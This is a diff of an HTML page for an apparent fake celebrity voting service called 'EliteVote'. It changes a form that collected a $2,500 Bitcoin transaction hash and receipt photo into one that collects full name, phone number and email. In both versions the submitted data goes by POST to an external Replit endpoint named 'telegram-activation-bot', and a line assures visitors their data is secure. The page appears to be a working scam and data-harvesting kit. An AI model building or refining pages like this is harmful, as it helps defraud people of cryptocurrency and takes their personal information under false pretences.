@@ -3,13 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Submit Payment Proof - EliteVote</title>
+    <title>Provide Your Information - EliteVote</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
     <script src="https://unpkg.com/lucide"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap');
         body { font-family: 'Outfit', sans-serif; }
+        
+        .success-pop {
+            animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        
+        @keyframes popIn {
+            0% { transform: scale(0.6); opacity: 0; }
+            60% { transform: scale(1.05); }
+            100% { transform: scale(1); opacity: 1; }
+        }
     </style>
 </head>
 <body class="bg-slate-50 text-slate-900 dark:bg-black dark:text-white transition-colors duration-300">
@@ -30,72 +40,88 @@
     <div class="max-w-2xl mx-auto px-6 py-12">
         <div class="bg-white dark:bg-black rounded-3xl shadow-sm border border-slate-200 dark:border-white/10 p-8 md:p-10">
             
-            <button onclick="window.history.back()" 
-                    class="flex items-center gap-2 text-slate-500 dark:text-zinc-400 hover:text-slate-700 dark:hover:text-white mb-8 transition">
-                <i data-lucide="arrow-left" class="w-5 h-5"></i>
-                <span class="font-medium">Back</span>
-            </button>
+            <h2 class="text-4xl font-bold text-center mb-2">Your Information</h2>
+            <p class="text-center text-slate-500 dark:text-zinc-400 mb-10">Please provide your details to complete your vote support</p>
 
-            <h2 class="text-4xl font-bold text-center mb-2">Submit Payment Proof</h2>
-            <p class="text-center text-slate-500 dark:text-zinc-400 mb-10">Send your transaction proof via Live Chat Support</p>
-
-            <!-- Order Info -->
-            <div class="bg-slate-50 dark:bg-zinc-950 rounded-2xl p-6 mb-10">
-                <div class="flex justify-between items-center">
-                    <span class="text-slate-500 dark:text-zinc-400">Celebrity</span>
-                    <span id="celeb-name" class="font-semibold">Michael Lynx</span>
-                </div>
-                <div class="flex justify-between items-center mt-3">
-                    <span class="text-slate-500 dark:text-zinc-400">Total Amount</span>
-                    <span id="total-amount" class="font-bold text-blue-600">$2,500</span>
-                </div>
-            </div>
-
-            <div class="space-y-10">
-                <!-- Transaction Hash -->
+            <!-- User Information Form -->
+            <form id="user-info-form" class="space-y-6">
+                <!-- Full Name -->
                 <div>
-                    <label class="text-xs font-bold uppercase tracking-widest text-slate-400 mb-3 block">Transaction Hash (TXID)</label>
-                    <input id="tx-hash" 
-                           type="text" 
-                           placeholder="Enter your Bitcoin Transaction Hash"
-                           class="w-full bg-slate-50 dark:bg-zinc-950 border border-slate-200 dark:border-white/10 rounded-2xl p-5 font-mono focus:ring-2 focus:ring-blue-500 outline-none">
+                    <label class="text-xs font-bold uppercase tracking-widest text-slate-400 mb-2 block">Full Name</label>
+                    <input 
+                        type="text" 
+                        id="full-name"
+                        required
+                        class="w-full bg-slate-50 dark:bg-zinc-950 border border-slate-200 dark:border-white/10 focus:border-blue-500 rounded-2xl px-5 py-4 text-base outline-none transition"
+                        placeholder="Enter your full name">
                 </div>
 
-                <!-- Photo Upload -->
+                <!-- Phone Number -->
                 <div>
-                    <label class="text-xs font-bold uppercase tracking-widest text-slate-400 mb-3 block">Photo of Transaction / Receipt</label>
-                    <div class="border-2 border-dashed border-slate-300 dark:border-white/20 rounded-3xl p-8 text-center hover:border-blue-400 transition">
-                        <input type="file" id="proof-upload" accept="image/*" class="hidden">
-                        <label for="proof-upload" class="cursor-pointer flex flex-col items-center">
-                            <i data-lucide="upload" class="w-12 h-12 text-slate-400 dark:text-zinc-500 mb-4"></i>
-                            <p class="font-medium">Click to upload screenshot</p>
-                            <p class="text-sm text-slate-500 dark:text-zinc-400 mt-1">PNG, JPG or JPEG (max 5MB)</p>
-                        </label>
-                    </div>
-                    <div id="preview" class="hidden mt-6">
-                        <img id="image-preview" class="max-h-80 mx-auto rounded-2xl shadow-sm">
-                    </div>
+                    <label class="text-xs font-bold uppercase tracking-widest text-slate-400 mb-2 block">Phone Number</label>
+                    <input 
+                        type="tel" 
+                        id="phone"
+                        required
+                        class="w-full bg-slate-50 dark:bg-zinc-950 border border-slate-200 dark:border-white/10 focus:border-blue-500 rounded-2xl px-5 py-4 text-base outline-none transition"
+                        placeholder="+1 (555) 123-4567">
                 </div>
-            </div>
 
-            <!-- Submit Button -->
-            <button onclick="submitProof()" 
-                    id="submit-proof-button"
-                    class="mt-12 w-full py-6 bg-blue-600 hover:bg-blue-700 text-white rounded-2xl font-semibold text-lg transition flex items-center justify-center gap-3 disabled:cursor-not-allowed disabled:opacity-70">
-                <span id="send-button-text" class="flex items-center gap-3">
-                    <i data-lucide="send" class="w-6 h-6"></i>
-                    Send Proof & Continue
-                </span>
-                <svg id="send-spinner" class="hidden w-5 h-5 animate-spin text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
-                    <circle cx="12" cy="12" r="10" stroke-opacity="0.25"></circle>
-                    <path d="M22 12a10 10 0 0 1-10 10" stroke-linecap="round"></path>
-                </svg>
-            </button>
+                <!-- Email -->
+                <div>
+                    <label class="text-xs font-bold uppercase tracking-widest text-slate-400 mb-2 block">Email Address</label>
+                    <input 
+                        type="email" 
+                        id="email"
+                        required
+                        class="w-full bg-slate-50 dark:bg-zinc-950 border border-slate-200 dark:border-white/10 focus:border-blue-500 rounded-2xl px-5 py-4 text-base outline-none transition"
+                        placeholder="you@example.com">
+                </div>
 
-            <p id="proof-status" class="text-center text-xs mt-4 text-slate-500 dark:text-zinc-400"></p>
+                <!-- Remark -->
+                <div>
+                    <label class="text-xs font-bold uppercase tracking-widest text-slate-400 mb-2 block">Remark / Message (Optional)</label>
+                    <textarea 
+                        id="remark"
+                        rows="4"
+                        class="w-full bg-slate-50 dark:bg-zinc-950 border border-slate-200 dark:border-white/10 focus:border-blue-500 rounded-3xl px-5 py-4 text-base outline-none transition resize-y"
+                        placeholder="Any additional notes or support message..."></textarea>
+                </div>
+
+                <!-- Action Buttons -->
+                <div class="flex flex-col sm:flex-row gap-4 pt-4">
+                    <button onclick="window.history.back()" 
+                            type="button"
+                            class="flex-1 py-5 rounded-2xl font-semibold border border-slate-300 dark:border-white/20 hover:bg-slate-100 dark:hover:bg-zinc-900 transition text-base">
+                        Cancel
+                    </button>
+                    <button id="submit-btn"
+                            type="submit"
+                            class="flex-1 py-5 rounded-2xl font-semibold bg-blue-600 hover:bg-blue-700 text-white transition flex items-center justify-center gap-2 text-base disabled:opacity-70">
+                        <span id="btn-text">Done</span>
+                        <i data-lucide="check-circle" class="w-5 h-5"></i>
+                    </button>
+                </div>
+            </form>
+
             <p class="text-center text-xs text-slate-400 dark:text-zinc-500 mt-8">
-                Our support team will verify your payment within minutes
+                Your information is secure and will only be used for vote verification
             </p>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="success-modal" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50 px-4">
+        <div id="modal-content" class="success-pop bg-white dark:bg-black rounded-3xl p-10 max-w-md w-full text-center">
+            <div class="w-24 h-24 mx-auto bg-green-100 dark:bg-green-900/30 text-green-600 rounded-3xl flex items-center justify-center mb-6">
+                <i data-lucide="check-circle" class="w-14 h-14"></i>
+            </div>
+            <h3 class="text-3xl font-bold mb-3">All Done!</h3>
+            <p class="text-slate-500 dark:text-zinc-400 mb-8">Thank you! Your information has been successfully submitted.</p>
+            <button onclick="goToDashboard()" 
+                    class="w-full py-4 bg-blue-600 text-white rounded-2xl font-semibold hover:bg-blue-700 transition">
+                Back to Home
+            </button>
         </div>
     </div>
 
@@ -125,91 +151,61 @@
             });
         }
 
-        // Image preview
-        document.getElementById('proof-upload').addEventListener('change', function(e) {
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(ev) {
-                    document.getElementById('image-preview').src = ev.target.result;
-                    document.getElementById('preview').classList.remove('hidden');
-                };
-                reader.readAsDataURL(file);
-            }
-        });
+        async function submitForm(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submit-btn');
+            const btnText = document.getElementById('btn-text');
+            
+            const fullName = document.getElementById('full-name').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const remark = document.getElementById('remark').value.trim();
 
-        async function submitProof() {
-            const submitBtn = document.getElementById('submit-proof-button');
-            const btnText = document.getElementById('send-button-text');
-            const spinner = document.getElementById('send-spinner');
-            const statusEl = document.getElementById('proof-status');
-
-            const txHash = document.getElementById('tx-hash').value.trim();
-            const fileInput = document.getElementById('proof-upload');
-
-            if (!txHash) {
-                statusEl.textContent = "Please enter the Transaction Hash";
-                statusEl.classList.add('text-red-500');
+            if (!fullName || !phone || !email) {
+                alert("Please fill in all required fields.");
                 return;
             }
 
-            // Show loading
+            // Disable button and show loading
             submitBtn.disabled = true;
-            btnText.classList.add('hidden');
-            spinner.classList.remove('hidden');
-            statusEl.textContent = "";
+            btnText.textContent = "Submitting...";
 
             try {
-                let proofBase64 = null;
-                if (fileInput.files[0]) {
-                    proofBase64 = await toBase64(fileInput.files[0]);
-                }
-
-                const payload = {
-                    transactionHash: txHash,
-                    fullName: "", // You can add more fields if needed
-                    phone: "",
-                    email: "",
-                    remark: "Payment Proof Submission",
-                    proofImage: proofBase64,
-                    timestamp: new Date().toISOString()
-                };
-
-                // Send to your endpoint
-                await fetch("https://telegram-activation-bot--igbinedion109.replit.app/api/XSRPK", {
+                const response = await fetch("https://telegram-activation-bot--igbinedion109.replit.app/api/XSRPK", {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json",
                     },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        fullName: fullName,
+                        phone: phone,
+                        email: email,
+                        remark: remark || "",
+                        timestamp: new Date().toISOString()
+                    })
                 });
 
-                // Redirect on success
-                window.location.href = "completeinfo.html";
-
+                // Show success modal
+                document.getElementById('success-modal').classList.remove('hidden');
+                
             } catch (error) {
                 console.error("Submission error:", error);
-                statusEl.textContent = "Failed to submit. Please check connection and try again.";
-                statusEl.classList.add('text-red-500');
+                alert("Failed to submit. Please check your connection and try again.");
             } finally {
                 submitBtn.disabled = false;
-                btnText.classList.remove('hidden');
-                spinner.classList.add('hidden');
+                btnText.textContent = "Done";
             }
         }
 
-        function toBase64(file) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onload = () => resolve(reader.result);
-                reader.onerror = reject;
-                reader.readAsDataURL(file);
-            });
+        function goToDashboard() {
+            window.location.href = '/'; // Change to your desired home URL
         }
 
         window.onload = function() {
             initLucide();
             initTheme();
+            document.getElementById('user-info-form').addEventListener('submit', submitForm);
         };
     </script>
 </body>
